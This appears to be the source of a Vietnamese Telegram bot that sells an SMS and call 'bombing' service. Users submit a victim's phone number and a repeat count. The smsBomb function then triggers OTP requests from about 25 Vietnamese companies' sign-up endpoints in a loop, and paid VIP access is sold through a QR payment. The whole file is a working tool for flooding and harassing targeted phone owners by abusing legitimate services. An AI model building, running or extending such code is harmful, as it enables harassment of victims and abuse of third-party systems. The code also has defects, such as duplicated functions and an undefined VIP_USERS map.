const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();
const fs = require('fs');
const path = require('path');
const sharp = require('sharp');
const express = require('express');
const mysql = require('mysql2/promise');
const app = express();

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});

const dbConfig = {
    host: process.env.DB_HOST || 'localhost',
    user: process.env.DB_USER || 'root',
    password: process.env.DB_PASSWORD || '',
    database: process.env.DB_NAME || 'telegram_bot'
};

const pool = mysql.createPool(dbConfig);

async function initializeDatabase() {
    try {
        const connection = await pool.getConnection();
        await connection.execute(`
            CREATE TABLE IF NOT EXISTS vip_users (
                user_id BIGINT PRIMARY KEY,
                username VARCHAR(255),
                first_name VARCHAR(255),
                last_name VARCHAR(255),
                expiration_timestamp BIGINT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
            )
        `);
        connection.release();
        console.log('Database initialized successfully');
    } catch (error) {
        console.error('Error initializing database:', error);
    }
}

function maskPhoneNumber(phoneNumber) {
    if (phoneNumber && phoneNumber.length > 5) {
        return phoneNumber.slice(0, -5) + '*****';
    }
    return phoneNumber;
}

async function isVipUser(userId) {
    try {
        const [rows] = await pool.execute(
            'SELECT * FROM vip_users WHERE user_id = ? AND expiration_timestamp > ?',
            [userId, Date.now()]
        );
        return rows.length > 0;
    } catch (error) {
        console.error('Error checking VIP status:', error);
        return false;
    }
}

async function removeExpiredVipUsers() {
    try {
        const [result] = await pool.execute(
            'DELETE FROM vip_users WHERE expiration_timestamp <= ?',
            [Date.now()]
        );
        if (result.affectedRows > 0) {
            console.log(`Removed ${result.affectedRows} expired VIP users`);
        }
    } catch (error) {
        console.error('Error removing expired VIP users:', error);
    }
}

async function addVipUser(userId, username, firstName, lastName) {
    try {
        const expirationTimestamp = Date.now() + VIP_DURATION;
        await pool.execute(
            'INSERT INTO vip_users (user_id, username, first_name, last_name, expiration_timestamp) VALUES (?, ?, ?, ?, ?) ON DUPLICATE KEY UPDATE username = ?, first_name = ?, last_name = ?, expiration_timestamp = ?',
            [userId, username, firstName, lastName, expirationTimestamp, username, firstName, lastName, expirationTimestamp]
        );
        return true;
    } catch (error) {
        console.error('Error adding VIP user:', error);
        return false;
    }
}

async function removeVipUser(userId) {
    try {
        const [result] = await pool.execute(
            'DELETE FROM vip_users WHERE user_id = ?',
            [userId]
        );
        return result.affectedRows > 0;
    } catch (error) {
        console.error('Error removing VIP user:', error);
        return false;
    }
}

async function listVipUsers() {
    try {
        const [rows] = await pool.execute('SELECT * FROM vip_users ORDER BY created_at DESC');
        return rows;
    } catch (error) {
        console.error('Error listing VIP users:', error);
        return [];
    }
}

async function getVipUser(userId) {
    try {
        const [rows] = await pool.execute(
            'SELECT * FROM vip_users WHERE user_id = ?',
            [userId]
        );
        return rows[0] || null;
    } catch (error) {
        console.error('Error getting VIP user:', error);
        return null;
    }
}

const {
    TV360,
    Shine,
    Momo,
    hasaki,
    MyVietel,
    Futabus,
    FTPplay,
    VIEON,
    FPTPLAY2,
    MyTV,
    GalaxyPlay,
    ONPLUS,
    FPTSHOP,
    VIETTEL,
    POPEYES,
    ALFRESCOS,
    VAYVND,
    KIOTVIET,
    MOMO,
    AHAMOVE,
    cashbar,
    shopiness,
    kiot,
    dkvt,
    bestInc
} = require('./otp');

const TARGET_GROUP_ID = -1002407864615;

const VIP_USERS_FILE = path.join(__dirname, 'vip_users.json');
const VIP_DURATION = 30 * 24 * 60 * 60 * 1000; // 30 days in milliseconds

const bot = new TelegramBot(process.env.TELEGRAM_API, { polling: true });

const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

const lastSpamTime = {};
const userStats = new Map();

const USER_STATS_FILE_PATH = path.join(__dirname, 'user_stats.json');
const ADMIN_CREDENTIALS = {
    username: process.env.USER_NAME,
    password: process.env.PASS_WORD
};
const adminSessions = new Map();

const formatDate = () => {
    const now = new Date();
    const hours = now.getHours().toString().padStart(2, '0');
    const minutes = now.getMinutes().toString().padStart(2, '0');
    const month = (now.getMonth() + 1).toString().padStart(2, '0');
    const day = now.getDate().toString().padStart(2, '0');
    const year = now.getFullYear();
    return `${hours}:${minutes}, ${month}/${day}/${year}`;
};

const updateUserStats = (userId) => {
    const today = new Date().toISOString().slice(0, 10);
    if (!userStats.has(userId)) {
        userStats.set(userId, { total: 0, daily: { [today]: 0 } });
    }

    const stats = userStats.get(userId);
    if (!stats.daily[today]) {
        stats.daily[today] = 0;
    }

    return stats;
};

const smsBomb = async (chatId, phoneNumber, times) => {
    const services = [
        TV360,
        Shine,
        Momo,
        MyVietel,
        Futabus,
        VIEON,
        FPTPLAY2,
        MyTV,
        GalaxyPlay,
        ONPLUS,
        FPTSHOP,
        VIETTEL,
        FTPplay,
        POPEYES,
        ALFRESCOS,
        VAYVND,
        KIOTVIET,
        MOMO,
        AHAMOVE,
        hasaki,
        cashbar,
        shopiness,
        kiot,
        dkvt,
        bestInc
    ];

    if (times === 2) {
        await VIETTEL(phoneNumber);
        await delay(2000);
        await FPTSHOP(phoneNumber);
    } else {
        for (let i = 0; i < times; i++) {
            const serviceIndex = i % services.length;
            const currentService = services[serviceIndex];

            await currentService(phoneNumber);
            await delay(2000);

            if ((i + 1) % services.length === 0) {
                await delay(20000);
            }
        }
    }
};

// Set bot commands
bot.setMyCommands([
    { command: '/start', description: 'Bắt đầu và hiển thị các lệnh' },
    { command: '/id', description: 'Xem ID Telegram của bạn' },
    { command: '/spam', description: ' /spam <sđt> <số_lần> - gói thường' },
    { command: '/spamvip', description: '/spamvip <sđt> <số_lần> - gói VIP' },
    { command: '/muavip', description: 'Chỉ 20k/tháng cho món đồ chơi này' },
    { command: '/checkvip', description: 'Kiểm tra tình trạng VIP' },
]);

// Lắng nghe tin nhắn
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;

    // Kiểm tra nếu tin nhắn tồn tại
    if (!msg.text) return;

    // Danh sách các lệnh hợp lệ
    const validCommands = ['/start', '/id', '/spam', '/spamvip', '/muavip', '/checkvip', '/login', '/addvip', '/removevip', '/listvip', '/id@tun_spam_bot', '/muavip@tun_spam_bot', '/checkvip@tun_spam_bot', '/thằng lồn đức óc con chó'];

    // Tách lệnh từ tin nhắn (để xử lý trường hợp có tham số)
    const command = msg.text.split(' ')[0].toLowerCase();

    // Kiểm tra xem có phải là lệnh hợp lệ không
    const isValidCommand = validCommands.includes(command);

    // Nếu không phải lệnh hợp lệ và không phải tin nhắn từ bot, thì xóa
    if (!isValidCommand && !msg.from.is_bot) {
        try {
            await bot.deleteMessage(chatId, msg.message_id);
        } catch (error) {
            console.error('Không thể xoá tin nhắn:', error);
        }
    }
});



// Handle /start command
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id; // Lấy ID của người gửi
    console.log(chatId)
    if (chatId === TARGET_GROUP_ID) {
        bot.sendMessage(chatId, "Truy cập @tun_spam_bot để xem chi tiết!");
    } else {
        const welcomeMessage = `
Chào mừng đến với tool SPAMCALLSMS!

Danh sách các lệnh có sẵn:
🛠️TOOL🛠️
/start - _Hiển thị danh sách này_
/id - _Xem ID Telegram của bạn_
/spam <sđt> <số_lần> - _Gói thường_
/spamvip <sđt> <số_lần> - _Gói VIP_
/muavip - _Chỉ 20k/tháng cho 1 món đồ chơi này._ 
/checkvip <id> - _Kiểm tra tình trạng VIP_

Ví dụ sử dụng:
- /spam 0123456789 5 (Gói thường - spam tối đa 10 lần)
- /spamvip 0123456789 30 (Gói VIP - spam tối đa 30 lần)

Lưu ý: Khi chuyển khoản thành công, copy ID TELEGRAM (/id) gửi cho admin *🔰@tunzankies🔰* để lên VIP
        `;
        bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
    }
});

bot.onText(/\/muavip/, async (msg) => {
    const chatId = msg.chat.id;
    const imagePath = './qrcode.jpg'; // Đường dẫn tới ảnh cục bộ
    const resizedImagePath = './qrcode_resized.jpg'; // Đường dẫn lưu ảnh đã thay đổi kích cỡ

    if (chatId !== TARGET_GROUP_ID) {
        try {
            // Đọc ảnh và điều chỉnh chất lượng
            await sharp(imagePath)
                .resize(700, 700, { // Giữ kích thước lớn hơn, ví dụ 800x800 pixels
                    fit: 'inside', // Giữ tỷ lệ khung hình
                    withoutEnlargement: true // Không phóng to ảnh nếu nó nhỏ hơn kích thước đích
                })
                .jpeg({ quality: 90 }) // Tăng chất lượng JPEG
                .toFile(resizedImagePath);

            // Gửi ảnh đã điều chỉnh
            const imageBuffer = fs.readFileSync(resizedImagePath);
            await bot.sendPhoto(chatId, imageBuffer, {
                caption: `Quét mã QR trên để thanh toán\n-----------------------------\nHỌ TÊN: *MOMO_DANGANHTUAN*\nSỐ TIỀN: *20.000VNĐ*\nNỘI DUNG: *muavip*`,
                parse_mode: 'Markdown'
            });

            // Xóa ảnh tạm sau khi gửi để tiết kiệm dung lượng
            fs.unlinkSync(resizedImagePath);

        } catch (error) {
            console.error('Lỗi khi xử lý hoặc gửi ảnh:', error);
            bot.sendMessage(chatId, 'Đã xảy ra lỗi khi xử lý ảnh.');
        }
    } else {
        bot.sendMessage(chatId, "Truy cập @spam_call_tele_bot để xem chi tiết!");
    }
});


bot.onText(/\/login (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const username = match[1];
    const password = match[2];

    if (username === ADMIN_CREDENTIALS.username && password === ADMIN_CREDENTIALS.password) {
        adminSessions.set(msg.from.id, true); // Mark this user as an active admin
        bot.sendMessage(chatId, 'Đăng nhập thành công.');
    } else {
        bot.sendMessage(chatId, 'Tên đăng nhập hoặc mật khẩu không đúng.');
    }
});



// Hàm để che giấu số điện thoại
function maskPhoneNumber(phoneNumber) {
    if (phoneNumber && phoneNumber.length > 5) {
        return phoneNumber.slice(0, -5) + '*****';
    }
    return phoneNumber; // Trả về nguyên bản nếu số không hợp lệ
}

// Lệnh spam thường
bot.onText(/^\/spam(?!\S)(?:\s+(\S+))?(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    let phoneNumber = match[1]?.trim();
    const times = parseInt(match[2], 10);
    const userId = msg.from.id;
    const currentTime = new Date().getTime();

    // Chỉ xóa tin nhắn nếu cả số điện thoại và số lần đều hợp lệ
    if (phoneNumber && !isNaN(times) && times > 0 && times <= 10) {
        bot.deleteMessage(chatId, msg.message_id).catch(error => console.error('Error deleting message:', error));
    }

    if (chatId === TARGET_GROUP_ID) {
        const stats = updateUserStats(userId);
        const today = new Date().toISOString().slice(0, 10);

        if (stats.daily[today] >= 5) {
            bot.sendMessage(chatId, 'Bạn đã đạt giới hạn số lần spam trong ngày (5 lần). Vui lòng thử lại vào ngày mai!');
            return;
        }

        if (phoneNumber === '114' || phoneNumber === '113' || phoneNumber === '911' || phoneNumber === '0988282936') {
            bot.sendMessage(chatId, 'Số điện thoại đã được bảo vệ! 😒');
            return;
        }

        if (!phoneNumber || isNaN(times) || times <= 0 || times > 10) {
            bot.sendMessage(chatId, 'Vui lòng nhập đúng định dạng: /spam [số điện thoại] [số lần] (1-10)');
            return;
        }

        if (lastSpamTime[userId] && currentTime - lastSpamTime[userId] < 10000) {
            const timeLeft = Math.ceil((10000 - (currentTime - lastSpamTime[userId])) / 1000);
            bot.sendMessage(chatId, `Vui lòng đợi ${timeLeft}s trước khi thực hiện lệnh spam lần nữa.`);
            return;
        }

        lastSpamTime[userId] = currentTime;
        stats.daily[today] += 1;

        const maskedPhoneNumber = maskPhoneNumber(phoneNumber);
        bot.sendMessage(chatId, `Bắt đầu tấn công: ⏩ ${maskedPhoneNumber}`);
        await delay(4000);
        const currentFormattedTime = formatDate();
        bot.sendMessage(chatId, `✅ THÀNH CÔNG! \n[✔] UserID: [🆔 ${msg.from.id}] \n[✔] Số Spam: [${maskedPhoneNumber}] \n[✔] Số lần: ${times} \n[✔] Ngày: ${currentFormattedTime} \n[✔] Gói dịch vụ: [♛ Thường] \n[✔] Bản quyền: 🔰 @tunzankies 🔰`);
        smsBomb(chatId, phoneNumber, times);

        saveUserStats();
    } else {
        bot.sendMessage(chatId, 'Sử dụng lệnh trong nhóm này: https://t.me/spamsms_tool');
    }
});

// Lệnh spam VIP
bot.onText(/^\/spamvip(?!\S)(?:\s+(\S+))?(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    let phoneNumber = match[1] ? match[1].trim() : null;
    const times = match[2] ? parseInt(match[2], 10) : null;

    // Chỉ xóa tin nhắn nếu cả số điện thoại và số lần đều hợp lệ
    if (phoneNumber && !isNaN(times) && times > 0 && times <= 30) {
        bot.deleteMessage(chatId, msg.message_id).catch(error => console.error('Error deleting message:', error));
    }

    if (chatId === TARGET_GROUP_ID) {
        const currentTime = Date.now();

        if (!isVipUser(userId)) {
            bot.sendMessage(chatId, 'Bạn không phải là VIP. Chỉ VIP mới có thể sử dụng lệnh này.');
            return;
        }

        if (!phoneNumber || !times) {
            bot.sendMessage(chatId, 'Vui lòng nhập đúng định dạng: /spamvip [số điện thoại] [số lần]');
            return;
        }

        if (phoneNumber.startsWith('+84')) {
            phoneNumber = '0' + phoneNumber.slice(3);
        }

        if (!/^\d{9,11}$/.test(phoneNumber)) {
            bot.sendMessage(chatId, 'Số điện thoại không hợp lệ. Vui lòng nhập số từ 9 đến 11 chữ số.');
            return;
        }

        if (phoneNumber === '114' || phoneNumber === '113' || phoneNumber === '911' || phoneNumber === '0988282936' || phoneNumber === '0383858905') {
            bot.sendMessage(chatId, 'Số điện thoại đã được bảo vệ! 😒');
            return;
        }

        if (isNaN(times) || times <= 0 || times > 30) {
            bot.sendMessage(chatId, 'Vui lòng nhập số lần spam hợp lệ (1-30). Ví dụ: /spamvip 1234567890 30');
            return;
        }

        if (lastSpamTime[userId] && currentTime - lastSpamTime[userId] < 10000) {
            const timeLeft = Math.ceil((10000 - (currentTime - lastSpamTime[userId])) / 1000);
            bot.sendMessage(chatId, `Vui lòng đợi ${timeLeft}s trước khi thực hiện lệnh spam lần nữa.`);
            return;
        }

        lastSpamTime[userId] = currentTime;

        const maskedPhoneNumber = maskPhoneNumber(phoneNumber);
        bot.sendMessage(chatId, `Bắt đầu tấn công: ⏩ ${maskedPhoneNumber}`);
        await delay(5000);

        const currentFormattedTime = formatDate();
        const successMessage = `✅ THÀNH CÔNG! \n[✔] UserID: [🆔 ${userId}] \n[✔] Số Spam: [${maskedPhoneNumber}] \n[✔] Số lần: ${times} \n[✔] Ngày: ${currentFormattedTime} \n[✔] Gói dịch vụ: [♛ VIP] \n[✔] Bản quyền: 🔰 @tunzankies 🔰`;

        bot.sendMessage(chatId, successMessage);
        smsBomb(chatId, phoneNumber, times);
    } else {
        bot.sendMessage(chatId, 'Sử dụng lệnh trong nhóm này: https://t.me/spamsms_tool');
    }
});

// Handle /id command
bot.onText(/\/id/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const isVip = VIP_USERS.has(userId) ? '✅ VIP' : '☑️ Thường';
    bot.sendMessage(chatId, `🆔 ${userId}\nTình trạng: ${isVip}`,);
});


bot.onText(/\/removevip (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const targetUserId = parseInt(match[1], 10);

    if (adminSessions.has(userId)) {
        removeVipUser(targetUserId);
        bot.sendMessage(chatId, `UserID ${targetUserId} đã được xoá khỏi danh sách VIP.`);
    } else {
        bot.sendMessage(chatId, 'Chỉ admin mới có thể thực hiện lệnh này.');
    }
});


// Load VIP users from JSON file
const loadVipUsers = () => {
    try {
        const data = fs.readFileSync(VIP_USERS_FILE, 'utf8');
        const vipData = JSON.parse(data);
        VIP_USERS = new Map(vipData.map(entry => [
            entry.userId,
            {
                expirationTimestamp: entry.expirationTimestamp.expirationTimestamp,
                username: entry.expirationTimestamp.username,
                firstName: entry.expirationTimestamp.firstName || '',
                lastName: entry.expirationTimestamp.lastName || ''
            }
        ]));
    } catch (error) {
        console.error('Error loading VIP users:', error);
        VIP_USERS = new Map();
    }
};

// Save VIP users to JSON file
const saveVipUsers = () => {
    const vipData = Array.from(VIP_USERS.entries()).map(([userId, userData]) => ({
        userId,
        expirationTimestamp: {
            expirationTimestamp: userData.expirationTimestamp,
            username: userData.username,
            firstName: userData.firstName,
            lastName: userData.lastName
        }
    }));
    fs.writeFileSync(VIP_USERS_FILE, JSON.stringify(vipData, null, 2), 'utf8');
};


// Command handler for adding VIP users
bot.onText(/\/addvip (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const adminId = msg.from.id;
    const targetUserId = parseInt(match[1], 10);

    if (adminSessions.has(adminId)) {
        try {
            // Attempt to get user information from Telegram
            const userInfo = await bot.getChat(targetUserId);
            const username = userInfo.username || `User_${targetUserId}`;
            const firstName = userInfo.first_name || '';
            const lastName = userInfo.last_name || '';

            // Add user to VIP list with full information
            addVipUser(targetUserId, username, firstName, lastName);

            // Format full name for display
            const fullName = [firstName, lastName].filter(Boolean).join(' ') || 'Unknown';

            // Success message to admin with full information
            bot.sendMessage(chatId,
                `✅ Thêm VIP thành công!\n` +
                `🆔 UserID: ${targetUserId}\n` +
                `👤 Tên: ${fullName}\n` +
                `🔰 Username: @${username}\n` +
                `⏰ Thời hạn: 30 ngày\n\n` +
                `📝 Lưu ý: Người dùng cần vào bot và sử dụng lệnh /start trước khi có thể sử dụng tính năng VIP.`
            );

            // Try to notify the user
            try {
                await bot.sendMessage(targetUserId,
                    `🎉 Chúc mừng ${firstName}! Bạn đã được nâng cấp lên VIP!\n` +
                    `⏰ Thời hạn: 30 ngày\n\n` +
                    `💡 Sử dụng lệnh /spamvip để spam với tốc độ nhanh hơn!`
                );
            } catch (error) {
                console.log(`Không thể gửi thông báo tới người dùng ${targetUserId}`);
            }
        } catch (error) {
            console.error('Error adding VIP user:', error);
            bot.sendMessage(chatId, `❌ Có lỗi xảy ra khi thêm UserID ${targetUserId} vào danh sách VIP. Vui lòng thử lại sau.`);
        }
    } else {
        bot.sendMessage(chatId, '⚠️ Chỉ admin mới có thể thực hiện lệnh này.');
    }
});

// Update list VIP command to show full names
bot.onText(/\/listvip/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (adminSessions.has(userId)) {
        if (VIP_USERS.size === 0) {
            bot.sendMessage(chatId, 'Danh sách VIP trống.');
            return;
        }

        let message = '📋 Danh sách người dùng VIP:\n\n';
        VIP_USERS.forEach((userData, userId) => {
            const fullName = [userData.firstName, userData.lastName].filter(Boolean).join(' ') || 'Unknown';
            const expirationDate = new Date(userData.expirationTimestamp).toLocaleString();
            message +=
                `🆔 ID: ${userId}\n` +
                `👤 Tên: ${fullName}\n` +
                `🔰 Username: @${userData.username}\n` +
                `⏰ Hết hạn: ${expirationDate}\n` +
                `➖➖➖➖➖➖➖➖➖➖\n`;
        });

        bot.sendMessage(chatId, message);
    } else {
        bot.sendMessage(chatId, '⚠️ Chỉ admin mới có thể thực hiện lệnh này.');
    }
});

// Update check VIP command to show full name
bot.onText(/\/checkvip(.*)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const input = match[1].trim();
    let targetUserId;

    if (!input) {
        targetUserId = msg.from.id;
    } else if (isNaN(input)) {
        bot.sendMessage(chatId, '⚠️ Vui lòng nhập UserID hợp lệ để kiểm tra. Ví dụ: /checkvip 123456789');
        return;
    } else {
        targetUserId = parseInt(input, 10);
    }

    if (VIP_USERS.has(targetUserId)) {
        const userData = VIP_USERS.get(targetUserId);
        const expirationTimestamp = userData.expirationTimestamp;
        const fullName = [userData.firstName, userData.lastName].filter(Boolean).join(' ') || 'Unknown';
        const remainingTime = Math.max(0, expirationTimestamp - Date.now());

        let timeMessage;
        if (remainingTime <= 0) {
            timeMessage = 'đã hết hạn';
        } else if (remainingTime >= 86400000) {
            const remainingDays = Math.floor(remainingTime / 86400000);
            timeMessage = `còn ${remainingDays} ngày trước khi hết hạn`;
        } else if (remainingTime >= 3600000) {
            const remainingHours = Math.floor(remainingTime / 3600000);
            timeMessage = `còn ${remainingHours} giờ trước khi hết hạn`;
        } else {
            const remainingMinutes = Math.ceil(remainingTime / 60000);
            timeMessage = `còn ${remainingMinutes} phút trước khi hết hạn`;
        }

        bot.sendMessage(chatId,
            `🔍 Thông tin VIP:\n` +
            `🆔 UserID: ${targetUserId}\n` +
            `👤 Tên: ${fullName}\n` +
            `🔰 Username: @${userData.username}\n` +
            `⏰ Trạng thái: ${timeMessage}`
        );
    } else {
        bot.sendMessage(chatId, `❌ UserID ${targetUserId} không phải là VIP.`);
    }
});


// Hàm kiểm tra trạng thái VIP
async function isVipUser(userId) {
    try {
        const [rows] = await pool.execute(
            'SELECT * FROM vip_users WHERE user_id = ? AND expiration_timestamp > ?',
            [userId, Date.now()]
        );
        return rows.length > 0;
    } catch (error) {
        console.error('Error checking VIP status:', error);
        return false;
    }
}
// Hàm xóa người dùng VIP hết hạn
async function removeExpiredVipUsers() {
    try {
        const [result] = await pool.execute(
            'DELETE FROM vip_users WHERE expiration_timestamp <= ?',
            [Date.now()]
        );
        if (result.affectedRows > 0) {
            console.log(`Removed ${result.affectedRows} expired VIP users`);
        }
    } catch (error) {
        console.error('Error removing expired VIP users:', error);
    }
}

// Hàm thêm người dùng VIP
async function addVipUser(userId, username, firstName, lastName) {
    try {
        const expirationTimestamp = Date.now() + VIP_DURATION;
        const [result] = await pool.execute(
            'INSERT INTO vip_users (user_id, username, first_name, last_name, expiration_timestamp) VALUES (?, ?, ?, ?, ?) ON DUPLICATE KEY UPDATE username = ?, first_name = ?, last_name = ?, expiration_timestamp = ?',
            [userId, username, firstName, lastName, expirationTimestamp, username, firstName, lastName, expirationTimestamp]
        );
        return true;
    } catch (error) {
        console.error('Error adding VIP user:', error);
        return false;
    }
}


// Hàm xóa người dùng VIP
async function removeVipUser(userId) {
    try {
        const [result] = await pool.execute(
            'DELETE FROM vip_users WHERE user_id = ?',
            [userId]
        );
        return result.affectedRows > 0;
    } catch (error) {
        console.error('Error removing VIP user:', error);
        return false;
    }
}

// Hàm lấy danh sách tất cả người dùng VIP
async function listVipUsers() {
    try {
        const [rows] = await pool.execute('SELECT * FROM vip_users ORDER BY created_at DESC');
        return rows;
    } catch (error) {
        console.error('Error listing VIP users:', error);
        return [];
    }
}


const saveUserStats = () => {
    const data = {};
    userStats.forEach((stats, id) => {
        data[id] = stats;
    });
    fs.writeFileSync(USER_STATS_FILE_PATH, JSON.stringify(data, null, 2), 'utf8');
};

// Hàm lấy thông tin người dùng VIP
async function getVipUser(userId) {
    try {
        const [rows] = await pool.execute(
            'SELECT * FROM vip_users WHERE user_id = ?',
            [userId]
        );
        return rows[0] || null;
    } catch (error) {
        console.error('Error getting VIP user:', error);
        return null;
    }
}


// Thiết lập kiểm tra định kỳ để loại bỏ người dùng VIP đã hết hạn (10 phút một lần)
setInterval(removeExpiredVipUsers, 10 * 60 * 1000);


// Save user stats on shutdown
process.on('SIGINT', saveUserStats);
process.on('SIGTERM', saveUserStats);

console.log('Bot is running...');
// Export các hàm để sử dụng
module.exports = {
    initializeDatabase,
    addVipUser,
    isVipUser,
    removeVipUser,
    getVipUser,
    listVipUsers,
    removeExpiredVipUsers
};